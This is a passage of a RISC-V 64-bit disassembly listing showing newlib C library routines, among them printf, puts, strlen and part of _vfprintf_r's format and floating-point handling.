   1080c:	f032                	sd	a2,32(sp)
   1080e:	f436                	sd	a3,40(sp)
   10810:	f83a                	sd	a4,48(sp)
   10812:	fc3e                	sd	a5,56(sp)
   10814:	e0c2                	sd	a6,64(sp)
   10816:	e4c6                	sd	a7,72(sp)
   10818:	862e                	mv	a2,a1
   1081a:	690c                	ld	a1,16(a0)
   1081c:	1014                	addi	a3,sp,32
   1081e:	ec06                	sd	ra,24(sp)
   10820:	e436                	sd	a3,8(sp)
   10822:	152000ef          	jal	ra,10974 <_vfprintf_r>
   10826:	60e2                	ld	ra,24(sp)
   10828:	6161                	addi	sp,sp,80
   1082a:	8082                	ret

000000000001082c <printf>:
   1082c:	711d                	addi	sp,sp,-96
   1082e:	f832                	sd	a2,48(sp)
   10830:	fc36                	sd	a3,56(sp)
   10832:	8501b303          	ld	t1,-1968(gp) # 1f5f8 <_impure_ptr>
   10836:	f42e                	sd	a1,40(sp)
   10838:	e0ba                	sd	a4,64(sp)
   1083a:	e4be                	sd	a5,72(sp)
   1083c:	e8c2                	sd	a6,80(sp)
   1083e:	ecc6                	sd	a7,88(sp)
   10840:	01033583          	ld	a1,16(t1) # 1016c <flushCache+0x6>
   10844:	1034                	addi	a3,sp,40
   10846:	862a                	mv	a2,a0
   10848:	851a                	mv	a0,t1
   1084a:	ec06                	sd	ra,24(sp)
   1084c:	e436                	sd	a3,8(sp)
   1084e:	126000ef          	jal	ra,10974 <_vfprintf_r>
   10852:	60e2                	ld	ra,24(sp)
   10854:	6125                	addi	sp,sp,96
   10856:	8082                	ret

0000000000010858 <_puts_r>:
   10858:	7159                	addi	sp,sp,-112
   1085a:	f0a2                	sd	s0,96(sp)
   1085c:	842a                	mv	s0,a0
   1085e:	852e                	mv	a0,a1
   10860:	eca6                	sd	s1,88(sp)
   10862:	f486                	sd	ra,104(sp)
   10864:	84ae                	mv	s1,a1
   10866:	07a000ef          	jal	ra,108e0 <strlen>
   1086a:	00150713          	addi	a4,a0,1
   1086e:	0000c697          	auipc	a3,0xc
   10872:	e7268693          	addi	a3,a3,-398 # 1c6e0 <__clzdi2+0x160>
   10876:	f43a                	sd	a4,40(sp)
   10878:	483c                	lw	a5,80(s0)
   1087a:	1818                	addi	a4,sp,48
   1087c:	e0b6                	sd	a3,64(sp)
   1087e:	ec3a                	sd	a4,24(sp)
   10880:	4685                	li	a3,1
   10882:	4709                	li	a4,2
   10884:	f826                	sd	s1,48(sp)
   10886:	fc2a                	sd	a0,56(sp)
   10888:	e4b6                	sd	a3,72(sp)
   1088a:	d03a                	sw	a4,32(sp)
   1088c:	680c                	ld	a1,16(s0)
   1088e:	cf8d                	beqz	a5,108c8 <_puts_r+0x70>
   10890:	01059783          	lh	a5,16(a1) # 4010 <register_fini-0xc0a0>
   10894:	03279713          	slli	a4,a5,0x32
   10898:	00074d63          	bltz	a4,108b2 <_puts_r+0x5a>
   1089c:	0ac5a703          	lw	a4,172(a1)
   108a0:	6689                	lui	a3,0x2
   108a2:	8fd5                	or	a5,a5,a3
   108a4:	76f9                	lui	a3,0xffffe
   108a6:	16fd                	addi	a3,a3,-1
   108a8:	8f75                	and	a4,a4,a3
   108aa:	00f59823          	sh	a5,16(a1)
   108ae:	0ae5a623          	sw	a4,172(a1)
   108b2:	0830                	addi	a2,sp,24
   108b4:	8522                	mv	a0,s0
   108b6:	6dc020ef          	jal	ra,12f92 <__sfvwrite_r>
   108ba:	ed09                	bnez	a0,108d4 <_puts_r+0x7c>
   108bc:	4529                	li	a0,10
   108be:	70a6                	ld	ra,104(sp)
   108c0:	7406                	ld	s0,96(sp)
   108c2:	64e6                	ld	s1,88(sp)
   108c4:	6165                	addi	sp,sp,112
   108c6:	8082                	ret
   108c8:	8522                	mv	a0,s0
   108ca:	e42e                	sd	a1,8(sp)
   108cc:	344020ef          	jal	ra,12c10 <__sinit>
   108d0:	65a2                	ld	a1,8(sp)
   108d2:	bf7d                	j	10890 <_puts_r+0x38>
   108d4:	557d                	li	a0,-1
   108d6:	b7e5                	j	108be <_puts_r+0x66>

00000000000108d8 <puts>:
   108d8:	85aa                	mv	a1,a0
   108da:	8501b503          	ld	a0,-1968(gp) # 1f5f8 <_impure_ptr>
   108de:	bfad                	j	10858 <_puts_r>

00000000000108e0 <strlen>:
   108e0:	00757793          	andi	a5,a0,7
   108e4:	872a                	mv	a4,a0
   108e6:	ebb9                	bnez	a5,1093c <strlen+0x5c>
   108e8:	0000f697          	auipc	a3,0xf
   108ec:	cc06b683          	ld	a3,-832(a3) # 1f5a8 <__SDATA_BEGIN__>
   108f0:	55fd                	li	a1,-1
   108f2:	6310                	ld	a2,0(a4)
   108f4:	0721                	addi	a4,a4,8
   108f6:	00d677b3          	and	a5,a2,a3
   108fa:	97b6                	add	a5,a5,a3
   108fc:	8fd1                	or	a5,a5,a2
   108fe:	8fd5                	or	a5,a5,a3
   10900:	feb789e3          	beq	a5,a1,108f2 <strlen+0x12>
   10904:	ff874683          	lbu	a3,-8(a4)
   10908:	40a707b3          	sub	a5,a4,a0
   1090c:	c6a9                	beqz	a3,10956 <strlen+0x76>
   1090e:	ff974683          	lbu	a3,-7(a4)
   10912:	ce9d                	beqz	a3,10950 <strlen+0x70>
   10914:	ffa74683          	lbu	a3,-6(a4)
   10918:	c6a9                	beqz	a3,10962 <strlen+0x82>
   1091a:	ffb74683          	lbu	a3,-5(a4)
   1091e:	ce9d                	beqz	a3,1095c <strlen+0x7c>
   10920:	ffc74683          	lbu	a3,-4(a4)
   10924:	ffd74603          	lbu	a2,-3(a4)
   10928:	ffe74503          	lbu	a0,-2(a4)
   1092c:	ce95                	beqz	a3,10968 <strlen+0x88>
   1092e:	c221                	beqz	a2,1096e <strlen+0x8e>
   10930:	00a03533          	snez	a0,a0
   10934:	953e                	add	a0,a0,a5
   10936:	1579                	addi	a0,a0,-2
   10938:	8082                	ret
   1093a:	d6dd                	beqz	a3,108e8 <strlen+0x8>
   1093c:	00074783          	lbu	a5,0(a4)
   10940:	0705                	addi	a4,a4,1
   10942:	00777693          	andi	a3,a4,7
   10946:	fbf5                	bnez	a5,1093a <strlen+0x5a>
   10948:	8f09                	sub	a4,a4,a0
   1094a:	fff70513          	addi	a0,a4,-1
   1094e:	8082                	ret
   10950:	ff978513          	addi	a0,a5,-7
   10954:	8082                	ret
   10956:	ff878513          	addi	a0,a5,-8
   1095a:	8082                	ret
   1095c:	ffb78513          	addi	a0,a5,-5
   10960:	8082                	ret
   10962:	ffa78513          	addi	a0,a5,-6
   10966:	8082                	ret
   10968:	ffc78513          	addi	a0,a5,-4
   1096c:	8082                	ret
   1096e:	ffd78513          	addi	a0,a5,-3
   10972:	8082                	ret

0000000000010974 <_vfprintf_r>:
   10974:	d8010113          	addi	sp,sp,-640
   10978:	26113c23          	sd	ra,632(sp)
   1097c:	25413823          	sd	s4,592(sp)
   10980:	25513423          	sd	s5,584(sp)
   10984:	23913423          	sd	s9,552(sp)
   10988:	8a2e                	mv	s4,a1
   1098a:	8cb2                	mv	s9,a2
   1098c:	e836                	sd	a3,16(sp)
   1098e:	26813823          	sd	s0,624(sp)
   10992:	26913423          	sd	s1,616(sp)
   10996:	27213023          	sd	s2,608(sp)
   1099a:	25313c23          	sd	s3,600(sp)
   1099e:	25613023          	sd	s6,576(sp)
   109a2:	23713c23          	sd	s7,568(sp)
   109a6:	23813823          	sd	s8,560(sp)
   109aa:	23a13023          	sd	s10,544(sp)
   109ae:	21b13c23          	sd	s11,536(sp)
   109b2:	8aaa                	mv	s5,a0
   109b4:	2c5040ef          	jal	ra,15478 <_localeconv_r>
   109b8:	611c                	ld	a5,0(a0)
   109ba:	853e                	mv	a0,a5
   109bc:	fcbe                	sd	a5,120(sp)
   109be:	f23ff0ef          	jal	ra,108e0 <strlen>
   109c2:	f8aa                	sd	a0,112(sp)
   109c4:	e202                	sd	zero,256(sp)
   109c6:	e602                	sd	zero,264(sp)
   109c8:	000a8663          	beqz	s5,109d4 <_vfprintf_r+0x60>
   109cc:	050aa783          	lw	a5,80(s5)
   109d0:	70078063          	beqz	a5,110d0 <_vfprintf_r+0x75c>
   109d4:	010a1703          	lh	a4,16(s4)
   109d8:	03071793          	slli	a5,a4,0x30
   109dc:	03271693          	slli	a3,a4,0x32
   109e0:	93c1                	srli	a5,a5,0x30
   109e2:	0006cf63          	bltz	a3,10a00 <_vfprintf_r+0x8c>
   109e6:	0aca2683          	lw	a3,172(s4)
   109ea:	6789                	lui	a5,0x2
   109ec:	8fd9                	or	a5,a5,a4
   109ee:	7779                	lui	a4,0xffffe
   109f0:	177d                	addi	a4,a4,-1
   109f2:	8f75                	and	a4,a4,a3
   109f4:	00fa1823          	sh	a5,16(s4)
   109f8:	17c2                	slli	a5,a5,0x30
   109fa:	0aea2623          	sw	a4,172(s4)
   109fe:	93c1                	srli	a5,a5,0x30
   10a00:	0087f713          	andi	a4,a5,8
   10a04:	26070463          	beqz	a4,10c6c <_vfprintf_r+0x2f8>
   10a08:	018a3703          	ld	a4,24(s4)
   10a0c:	26070063          	beqz	a4,10c6c <_vfprintf_r+0x2f8>
   10a10:	8be9                	andi	a5,a5,26
   10a12:	4729                	li	a4,10
   10a14:	26e78963          	beq	a5,a4,10c86 <_vfprintf_r+0x312>
   10a18:	000cc783          	lbu	a5,0(s9)
   10a1c:	19010b93          	addi	s7,sp,400
   10a20:	ea5e                	sd	s7,272(sp)
   10a22:	f202                	sd	zero,288(sp)
   10a24:	10012c23          	sw	zero,280(sp)
   10a28:	f002                	sd	zero,32(sp)
   10a2a:	f402                	sd	zero,40(sp)
   10a2c:	e102                	sd	zero,128(sp)
   10a2e:	f482                	sd	zero,104(sp)
   10a30:	e502                	sd	zero,136(sp)
   10a32:	e902                	sd	zero,144(sp)
   10a34:	e002                	sd	zero,0(sp)
   10a36:	835e                	mv	t1,s7
   10a38:	4d41                	li	s10,16
   10a3a:	0000c917          	auipc	s2,0xc
   10a3e:	e8e90913          	addi	s2,s2,-370 # 1c8c8 <zeroes.4521>
   10a42:	1c078663          	beqz	a5,10c0e <_vfprintf_r+0x29a>
   10a46:	8466                	mv	s0,s9
   10a48:	02500713          	li	a4,37
   10a4c:	30e78463          	beq	a5,a4,10d54 <_vfprintf_r+0x3e0>
   10a50:	00144783          	lbu	a5,1(s0)
   10a54:	0405                	addi	s0,s0,1
   10a56:	fbfd                	bnez	a5,10a4c <_vfprintf_r+0xd8>
   10a58:	419404bb          	subw	s1,s0,s9
   10a5c:	1a048963          	beqz	s1,10c0e <_vfprintf_r+0x29a>
   10a60:	7712                	ld	a4,288(sp)
   10a62:	11812783          	lw	a5,280(sp)
   10a66:	01933023          	sd	s9,0(t1)
   10a6a:	9726                	add	a4,a4,s1
   10a6c:	2785                	addiw	a5,a5,1
   10a6e:	00933423          	sd	s1,8(t1)
   10a72:	f23a                	sd	a4,288(sp)
   10a74:	10f12c23          	sw	a5,280(sp)
   10a78:	0007871b          	sext.w	a4,a5
   10a7c:	479d                	li	a5,7
   10a7e:	0341                	addi	t1,t1,16
   10a80:	2ee7c163          	blt	a5,a4,10d62 <_vfprintf_r+0x3ee>
   10a84:	6702                	ld	a4,0(sp)
   10a86:	00044783          	lbu	a5,0(s0)
   10a8a:	9f25                	addw	a4,a4,s1
   10a8c:	e03a                	sd	a4,0(sp)
   10a8e:	18078063          	beqz	a5,10c0e <_vfprintf_r+0x29a>
   10a92:	00144f03          	lbu	t5,1(s0)
   10a96:	0c010fa3          	sb	zero,223(sp)
   10a9a:	0405                	addi	s0,s0,1
   10a9c:	5efd                	li	t4,-1
   10a9e:	4b01                	li	s6,0
   10aa0:	4481                	li	s1,0
   10aa2:	49a5                	li	s3,9
   10aa4:	02a00c13          	li	s8,42
   10aa8:	0405                	addi	s0,s0,1
   10aaa:	000f0d9b          	sext.w	s11,t5
   10aae:	05a00693          	li	a3,90
   10ab2:	fe0d879b          	addiw	a5,s11,-32
   10ab6:	0007871b          	sext.w	a4,a5
   10aba:	04e6e663          	bltu	a3,a4,10b06 <_vfprintf_r+0x192>
   10abe:	1782                	slli	a5,a5,0x20
   10ac0:	0000c717          	auipc	a4,0xc
   10ac4:	c8870713          	addi	a4,a4,-888 # 1c748 <__clzdi2+0x1c8>
   10ac8:	83f9                	srli	a5,a5,0x1e
   10aca:	97ba                	add	a5,a5,a4
   10acc:	439c                	lw	a5,0(a5)
   10ace:	97ba                	add	a5,a5,a4
   10ad0:	8782                	jr	a5
   10ad2:	4b01                	li	s6,0
   10ad4:	00044703          	lbu	a4,0(s0)
   10ad8:	002b179b          	slliw	a5,s6,0x2
   10adc:	01678b3b          	addw	s6,a5,s6
   10ae0:	fd0d8f1b          	addiw	t5,s11,-48
   10ae4:	001b1b1b          	slliw	s6,s6,0x1
   10ae8:	fd07079b          	addiw	a5,a4,-48
   10aec:	0405                	addi	s0,s0,1
   10aee:	016f0b3b          	addw	s6,t5,s6
   10af2:	00070d9b          	sext.w	s11,a4
   10af6:	fcf9ffe3          	bgeu	s3,a5,10ad4 <_vfprintf_r+0x160>
   10afa:	fe0d879b          	addiw	a5,s11,-32
   10afe:	0007871b          	sext.w	a4,a5
   10b02:	fae6fee3          	bgeu	a3,a4,10abe <_vfprintf_r+0x14a>
   10b06:	100d8463          	beqz	s11,10c0e <_vfprintf_r+0x29a>
   10b0a:	13b10423          	sb	s11,296(sp)
   10b0e:	0c010fa3          	sb	zero,223(sp)
   10b12:	4985                	li	s3,1
   10b14:	4c05                	li	s8,1
   10b16:	12810c93          	addi	s9,sp,296
   10b1a:	ec02                	sd	zero,24(sp)
   10b1c:	4e81                	li	t4,0
   10b1e:	e882                	sd	zero,80(sp)
   10b20:	f082                	sd	zero,96(sp)
   10b22:	ec82                	sd	zero,88(sp)
   10b24:	0024f793          	andi	a5,s1,2
   10b28:	0007829b          	sext.w	t0,a5
   10b2c:	c391                	beqz	a5,10b30 <_vfprintf_r+0x1bc>
   10b2e:	2989                	addiw	s3,s3,2
   10b30:	0844ff93          	andi	t6,s1,132
   10b34:	7792                	ld	a5,288(sp)
   10b36:	000f9663          	bnez	t6,10b42 <_vfprintf_r+0x1ce>
   10b3a:	413b06bb          	subw	a3,s6,s3
   10b3e:	2cd046e3          	bgtz	a3,1160a <_vfprintf_r+0xc96>
   10b42:	0df14703          	lbu	a4,223(sp)
   10b46:	c70d                	beqz	a4,10b70 <_vfprintf_r+0x1fc>
   10b48:	11812703          	lw	a4,280(sp)
   10b4c:	0df10693          	addi	a3,sp,223
   10b50:	00d33023          	sd	a3,0(t1)
   10b54:	2705                	addiw	a4,a4,1
   10b56:	4685                	li	a3,1
   10b58:	0785                	addi	a5,a5,1
   10b5a:	00d33423          	sd	a3,8(t1)
   10b5e:	10e12c23          	sw	a4,280(sp)
   10b62:	0007069b          	sext.w	a3,a4
   10b66:	f23e                	sd	a5,288(sp)
   10b68:	471d                	li	a4,7
   10b6a:	0341                	addi	t1,t1,16
   10b6c:	42d74863          	blt	a4,a3,10f9c <_vfprintf_r+0x628>
   10b70:	02028563          	beqz	t0,10b9a <_vfprintf_r+0x226>
   10b74:	11812703          	lw	a4,280(sp)
   10b78:	1194                	addi	a3,sp,224
   10b7a:	00d33023          	sd	a3,0(t1)
   10b7e:	2705                	addiw	a4,a4,1
   10b80:	4689                	li	a3,2
   10b82:	0789                	addi	a5,a5,2
   10b84:	00d33423          	sd	a3,8(t1)
   10b88:	10e12c23          	sw	a4,280(sp)
   10b8c:	0007069b          	sext.w	a3,a4
   10b90:	f23e                	sd	a5,288(sp)
   10b92:	471d                	li	a4,7
   10b94:	0341                	addi	t1,t1,16
   10b96:	30d74ce3          	blt	a4,a3,116ae <_vfprintf_r+0xd3a>
   10b9a:	08000713          	li	a4,128
   10b9e:	06ef81e3          	beq	t6,a4,11400 <_vfprintf_r+0xa8c>
   10ba2:	418e8ebb          	subw	t4,t4,s8
   10ba6:	0fd043e3          	bgtz	t4,1148c <_vfprintf_r+0xb18>
   10baa:	1004f713          	andi	a4,s1,256
   10bae:	78071663          	bnez	a4,1133a <_vfprintf_r+0x9c6>
   10bb2:	11812703          	lw	a4,280(sp)
   10bb6:	97e2                	add	a5,a5,s8
   10bb8:	01933023          	sd	s9,0(t1)
   10bbc:	0017069b          	addiw	a3,a4,1
   10bc0:	8736                	mv	a4,a3
   10bc2:	01833423          	sd	s8,8(t1)
   10bc6:	10e12c23          	sw	a4,280(sp)
   10bca:	f23e                	sd	a5,288(sp)
   10bcc:	471d                	li	a4,7
   10bce:	44d74963          	blt	a4,a3,11020 <_vfprintf_r+0x6ac>
   10bd2:	0341                	addi	t1,t1,16
   10bd4:	8891                	andi	s1,s1,4
   10bd6:	c489                	beqz	s1,10be0 <_vfprintf_r+0x26c>
   10bd8:	413b04bb          	subw	s1,s6,s3
   10bdc:	2e9048e3          	bgtz	s1,116cc <_vfprintf_r+0xd58>
   10be0:	875a                	mv	a4,s6
   10be2:	013b5363          	bge	s6,s3,10be8 <_vfprintf_r+0x274>
   10be6:	874e                	mv	a4,s3
   10be8:	6682                	ld	a3,0(sp)
   10bea:	9f35                	addw	a4,a4,a3
   10bec:	e03a                	sd	a4,0(sp)
   10bee:	10079ce3          	bnez	a5,11506 <_vfprintf_r+0xb92>
   10bf2:	67e2                	ld	a5,24(sp)
   10bf4:	10012c23          	sw	zero,280(sp)
   10bf8:	c789                	beqz	a5,10c02 <_vfprintf_r+0x28e>
   10bfa:	65e2                	ld	a1,24(sp)
   10bfc:	8556                	mv	a0,s5
   10bfe:	144020ef          	jal	ra,12d42 <_free_r>
   10c02:	835e                	mv	t1,s7
   10c04:	8ca2                	mv	s9,s0
   10c06:	000cc783          	lbu	a5,0(s9)
   10c0a:	e2079ee3          	bnez	a5,10a46 <_vfprintf_r+0xd2>
   10c0e:	7792                	ld	a5,288(sp)
   10c10:	c399                	beqz	a5,10c16 <_vfprintf_r+0x2a2>
   10c12:	2de0106f          	j	11ef0 <_vfprintf_r+0x157c>
   10c16:	010a5783          	lhu	a5,16(s4)
   10c1a:	0407f793          	andi	a5,a5,64
   10c1e:	c399                	beqz	a5,10c24 <_vfprintf_r+0x2b0>
   10c20:	67c0106f          	j	1229c <_vfprintf_r+0x1928>
   10c24:	27813083          	ld	ra,632(sp)
   10c28:	27013403          	ld	s0,624(sp)
   10c2c:	6502                	ld	a0,0(sp)
   10c2e:	26813483          	ld	s1,616(sp)
   10c32:	26013903          	ld	s2,608(sp)
   10c36:	25813983          	ld	s3,600(sp)
   10c3a:	25013a03          	ld	s4,592(sp)
   10c3e:	24813a83          	ld	s5,584(sp)
   10c42:	24013b03          	ld	s6,576(sp)
   10c46:	23813b83          	ld	s7,568(sp)
   10c4a:	23013c03          	ld	s8,560(sp)
   10c4e:	22813c83          	ld	s9,552(sp)
   10c52:	22013d03          	ld	s10,544(sp)
   10c56:	21813d83          	ld	s11,536(sp)
   10c5a:	28010113          	addi	sp,sp,640
   10c5e:	8082                	ret
   10c60:	0104e493          	ori	s1,s1,16
   10c64:	00044f03          	lbu	t5,0(s0)
   10c68:	2481                	sext.w	s1,s1
   10c6a:	bd3d                	j	10aa8 <_vfprintf_r+0x134>
   10c6c:	85d2                	mv	a1,s4
   10c6e:	8556                	mv	a0,s5
   10c70:	1c1010ef          	jal	ra,12630 <__swsetup_r>
   10c74:	c119                	beqz	a0,10c7a <_vfprintf_r+0x306>
   10c76:	6260106f          	j	1229c <_vfprintf_r+0x1928>
   10c7a:	010a5783          	lhu	a5,16(s4)
   10c7e:	4729                	li	a4,10
   10c80:	8be9                	andi	a5,a5,26
   10c82:	d8e79be3          	bne	a5,a4,10a18 <_vfprintf_r+0xa4>
   10c86:	012a1783          	lh	a5,18(s4)
   10c8a:	d807c7e3          	bltz	a5,10a18 <_vfprintf_r+0xa4>
   10c8e:	66c2                	ld	a3,16(sp)
   10c90:	8666                	mv	a2,s9
   10c92:	85d2                	mv	a1,s4
   10c94:	8556                	mv	a0,s5
   10c96:	107010ef          	jal	ra,1259c <__sbprintf>
   10c9a:	e02a                	sd	a0,0(sp)
   10c9c:	b761                	j	10c24 <_vfprintf_r+0x2b0>
   10c9e:	0104e493          	ori	s1,s1,16
   10ca2:	2481                	sext.w	s1,s1
   10ca4:	66c2                	ld	a3,16(sp)
   10ca6:	0204f793          	andi	a5,s1,32
   10caa:	00868713          	addi	a4,a3,8
   10cae:	3a078263          	beqz	a5,11052 <_vfprintf_r+0x6de>
   10cb2:	629c                	ld	a5,0(a3)
   10cb4:	89be                	mv	s3,a5
   10cb6:	3a07cc63          	bltz	a5,1106e <_vfprintf_r+0x6fa>
   10cba:	57fd                	li	a5,-1
   10cbc:	48fe87e3          	beq	t4,a5,1194a <_vfprintf_r+0xfd6>
   10cc0:	f7f4f493          	andi	s1,s1,-129
   10cc4:	e83a                	sd	a4,16(sp)
   10cc6:	0004881b          	sext.w	a6,s1
   10cca:	120993e3          	bnez	s3,115f0 <_vfprintf_r+0xc7c>
   10cce:	120e94e3          	bnez	t4,115f6 <_vfprintf_r+0xc82>
   10cd2:	84c2                	mv	s1,a6
   10cd4:	4e81                	li	t4,0
   10cd6:	4c01                	li	s8,0
   10cd8:	18c10c93          	addi	s9,sp,396
   10cdc:	000c099b          	sext.w	s3,s8
   10ce0:	01dc5463          	bge	s8,t4,10ce8 <_vfprintf_r+0x374>
   10ce4:	000e899b          	sext.w	s3,t4
   10ce8:	0df14783          	lbu	a5,223(sp)
   10cec:	ec02                	sd	zero,24(sp)
   10cee:	e882                	sd	zero,80(sp)
   10cf0:	f082                	sd	zero,96(sp)
   10cf2:	ec82                	sd	zero,88(sp)
   10cf4:	e20788e3          	beqz	a5,10b24 <_vfprintf_r+0x1b0>
   10cf8:	2985                	addiw	s3,s3,1
   10cfa:	b52d                	j	10b24 <_vfprintf_r+0x1b0>
   10cfc:	0104e493          	ori	s1,s1,16
   10d00:	2481                	sext.w	s1,s1
   10d02:	66c2                	ld	a3,16(sp)
   10d04:	0204f793          	andi	a5,s1,32
   10d08:	00868713          	addi	a4,a3,8
   10d0c:	32078463          	beqz	a5,11034 <_vfprintf_r+0x6c0>
   10d10:	0006b983          	ld	s3,0(a3)
   10d14:	bff4f493          	andi	s1,s1,-1025
   10d18:	0004881b          	sext.w	a6,s1
   10d1c:	e83a                	sd	a4,16(sp)
   10d1e:	4781                	li	a5,0
   10d20:	0c010fa3          	sb	zero,223(sp)
   10d24:	577d                	li	a4,-1
   10d26:	36ee8063          	beq	t4,a4,11086 <_vfprintf_r+0x712>
   10d2a:	f7f87493          	andi	s1,a6,-129
   10d2e:	2481                	sext.w	s1,s1
   10d30:	0a099ce3          	bnez	s3,115e8 <_vfprintf_r+0xc74>
   10d34:	5c0e9663          	bnez	t4,11300 <_vfprintf_r+0x98c>
   10d38:	ffd1                	bnez	a5,10cd4 <_vfprintf_r+0x360>
   10d3a:	00187c13          	andi	s8,a6,1
   10d3e:	18c10c93          	addi	s9,sp,396
   10d42:	f80c0de3          	beqz	s8,10cdc <_vfprintf_r+0x368>
   10d46:	03000793          	li	a5,48
   10d4a:	18f105a3          	sb	a5,395(sp)
   10d4e:	18b10c93          	addi	s9,sp,395
   10d52:	b769                	j	10cdc <_vfprintf_r+0x368>
   10d54:	419404bb          	subw	s1,s0,s9
   10d58:	d00494e3          	bnez	s1,10a60 <_vfprintf_r+0xec>
   10d5c:	00044783          	lbu	a5,0(s0)
   10d60:	b33d                	j	10a8e <_vfprintf_r+0x11a>
   10d62:	0a10                	addi	a2,sp,272
   10d64:	85d2                	mv	a1,s4
   10d66:	8556                	mv	a0,s5
   10d68:	1ca080ef          	jal	ra,18f32 <__sprint_r>
   10d6c:	ea0515e3          	bnez	a0,10c16 <_vfprintf_r+0x2a2>
   10d70:	835e                	mv	t1,s7
   10d72:	bb09                	j	10a84 <_vfprintf_r+0x110>
   10d74:	0084f793          	andi	a5,s1,8
   10d78:	3a079ee3          	bnez	a5,11934 <_vfprintf_r+0xfc0>
   10d7c:	67c2                	ld	a5,16(sp)
   10d7e:	ec1a                	sd	t1,24(sp)
   10d80:	e476                	sd	t4,8(sp)
   10d82:	2388                	fld	fa0,0(a5)
   10d84:	00878693          	addi	a3,a5,8 # 2008 <register_fini-0xe0a8>
   10d88:	e836                	sd	a3,16(sp)
   10d8a:	5040b0ef          	jal	ra,1c28e <__extenddftf2>
   10d8e:	6362                	ld	t1,24(sp)
   10d90:	6ea2                	ld	t4,8(sp)
   10d92:	e22a                	sd	a0,256(sp)
   10d94:	e62e                	sd	a1,264(sp)
   10d96:	0208                	addi	a0,sp,256
   10d98:	ec1a                	sd	t1,24(sp)
   10d9a:	e476                	sd	t4,8(sp)
   10d9c:	6a0040ef          	jal	ra,1543c <_ldcheck>
   10da0:	d5aa                	sw	a0,232(sp)
   10da2:	4789                	li	a5,2
   10da4:	6ea2                	ld	t4,8(sp)
   10da6:	6362                	ld	t1,24(sp)
   10da8:	64f502e3          	beq	a0,a5,11bec <_vfprintf_r+0x1278>
   10dac:	4785                	li	a5,1
   10dae:	6ef50ee3          	beq	a0,a5,11caa <_vfprintf_r+0x1336>
   10db2:	06100793          	li	a5,97
   10db6:	00fd9463          	bne	s11,a5,10dbe <_vfprintf_r+0x44a>
   10dba:	5740106f          	j	1232e <_vfprintf_r+0x19ba>
   10dbe:	04100793          	li	a5,65
   10dc2:	00fd9463          	bne	s11,a5,10dca <_vfprintf_r+0x456>
   10dc6:	1380106f          	j	11efe <_vfprintf_r+0x158a>
   10dca:	fdfdf713          	andi	a4,s11,-33
   10dce:	57fd                	li	a5,-1
   10dd0:	f0ba                	sd	a4,96(sp)
   10dd2:	00fe9463          	bne	t4,a5,10dda <_vfprintf_r+0x466>
   10dd6:	6140106f          	j	123ea <_vfprintf_r+0x1a76>
   10dda:	04700793          	li	a5,71
   10dde:	00f71463          	bne	a4,a5,10de6 <_vfprintf_r+0x472>
   10de2:	5c40106f          	j	123a6 <_vfprintf_r+0x1a32>
   10de6:	69b2                	ld	s3,264(sp)
   10de8:	1004e793          	ori	a5,s1,256
   10dec:	ed26                	sd	s1,152(sp)
   10dee:	6c12                	ld	s8,256(sp)
   10df0:	2781                	sext.w	a5,a5
   10df2:	0009d463          	bgez	s3,10dfa <_vfprintf_r+0x486>
   10df6:	67a0106f          	j	12470 <_vfprintf_r+0x1afc>
   10dfa:	e582                	sd	zero,200(sp)
   10dfc:	84be                	mv	s1,a5
   10dfe:	ec02                	sd	zero,24(sp)
   10e00:	2701                	sext.w	a4,a4
   10e02:	04600793          	li	a5,70
   10e06:	00f71463          	bne	a4,a5,10e0e <_vfprintf_r+0x49a>
   10e0a:	38a0106f          	j	12194 <_vfprintf_r+0x1820>
   10e0e:	7706                	ld	a4,96(sp)
   10e10:	04500793          	li	a5,69
   10e14:	00f70463          	beq	a4,a5,10e1c <_vfprintf_r+0x4a8>
   10e18:	33c0106f          	j	12154 <_vfprintf_r+0x17e0>
   10e1c:	001e871b          	addiw	a4,t4,1
   10e20:	0f810893          	addi	a7,sp,248
   10e24:	0ec10813          	addi	a6,sp,236
   10e28:	11bc                	addi	a5,sp,232
   10e2a:	4689                	li	a3,2
   10e2c:	85e2                	mv	a1,s8
   10e2e:	864e                	mv	a2,s3
   10e30:	8556                	mv	a0,s5
   10e32:	f81a                	sd	t1,48(sp)
   10e34:	f076                	sd	t4,32(sp)
   10e36:	e43a                	sd	a4,8(sp)
   10e38:	78c030ef          	jal	ra,145c4 <_ldtoa_r>
   10e3c:	6722                	ld	a4,8(sp)
   10e3e:	7e82                	ld	t4,32(sp)
   10e40:	7342                	ld	t1,48(sp)
   10e42:	8caa                	mv	s9,a0
   10e44:	00e508b3          	add	a7,a0,a4
   10e48:	4601                	li	a2,0
   10e4a:	4681                	li	a3,0
   10e4c:	8562                	mv	a0,s8
   10e4e:	85ce                	mv	a1,s3
   10e50:	f846                	sd	a7,48(sp)
   10e52:	f01a                	sd	t1,32(sp)
   10e54:	e476                	sd	t4,8(sp)
   10e56:	3540a0ef          	jal	ra,1b1aa <__eqtf2>
   10e5a:	78c2                	ld	a7,48(sp)
   10e5c:	6ea2                	ld	t4,8(sp)
   10e5e:	7302                	ld	t1,32(sp)
   10e60:	87c6                	mv	a5,a7
   10e62:	cd11                	beqz	a0,10e7e <_vfprintf_r+0x50a>
   10e64:	77ee                	ld	a5,248(sp)
   10e66:	0117fc63          	bgeu	a5,a7,10e7e <_vfprintf_r+0x50a>
   10e6a:	03000693          	li	a3,48
   10e6e:	00178713          	addi	a4,a5,1
   10e72:	fdba                	sd	a4,248(sp)
   10e74:	00d78023          	sb	a3,0(a5)
   10e78:	77ee                	ld	a5,248(sp)
   10e7a:	ff17eae3          	bltu	a5,a7,10e6e <_vfprintf_r+0x4fa>
   10e7e:	419787bb          	subw	a5,a5,s9
   10e82:	f03e                	sd	a5,32(sp)
   10e84:	572e                	lw	a4,232(sp)
   10e86:	04700793          	li	a5,71
   10e8a:	ecba                	sd	a4,88(sp)
   10e8c:	7706                	ld	a4,96(sp)
   10e8e:	00f71463          	bne	a4,a5,10e96 <_vfprintf_r+0x522>
   10e92:	2200106f          	j	120b2 <_vfprintf_r+0x173e>
   10e96:	7706                	ld	a4,96(sp)
   10e98:	04600793          	li	a5,70
   10e9c:	00f71463          	bne	a4,a5,10ea4 <_vfprintf_r+0x530>
   10ea0:	3c40106f          	j	12264 <_vfprintf_r+0x18f0>
   10ea4:	67e6                	ld	a5,88(sp)
   10ea6:	7586                	ld	a1,96(sp)
   10ea8:	04100613          	li	a2,65
   10eac:	37fd                	addiw	a5,a5,-1
   10eae:	d5be                	sw	a5,232(sp)
   10eb0:	0ffdf713          	andi	a4,s11,255
   10eb4:	4681                	li	a3,0
   10eb6:	00c59663          	bne	a1,a2,10ec2 <_vfprintf_r+0x54e>
